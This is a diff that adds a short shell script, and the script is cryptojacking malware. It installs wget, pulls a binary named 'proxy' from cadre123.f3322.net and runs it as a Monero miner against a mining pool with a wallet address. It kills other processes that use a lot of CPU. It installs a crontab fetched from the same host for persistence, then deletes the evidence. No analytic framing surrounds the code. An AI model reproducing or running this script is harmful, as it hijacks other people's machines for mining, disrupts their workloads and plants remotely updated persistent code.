@@ -1,0 +1,23 @@
+rpm -q wget >/dev/null
+if [ $? == 0 ];
+then
+echo 123 >/dev/null
+else
+yum -y install wget
+sudo apt-get install wget -y
+fi
+pkill -9 proxy
+if [ -f "/tmp/proxy" ];then
+
+echo 123 > /dev/null
+else
+wget -P /tmp http://cadre123.f3322.net:753/proxy
+fi
+chmod +x /tmp/nssa
+chmod +x /tmp/proxy
+sleep 3
+/tmp/proxy -o stratum+tcp://mine.ppxxmr.com:3333 -u 4A7sJwfkFrWB88V8NiJ2Fi3RwsWkR48PQ5hG2qXq6hu2U7e8fcVLJ81WtTzHGdNChsejcygkvUGpbiiUXAWXprWYHnBEvqC+lin -p x -k -B
+ps -e -o "pid %cpu CMD"|grep -v proxy|   awk '{if($2>=40.0) print $1}' | while read procid; do kill -9 $procid; done
+wget http://cadre123.f3322.net:753/cron
+crontab cron
+rm -rf cron*
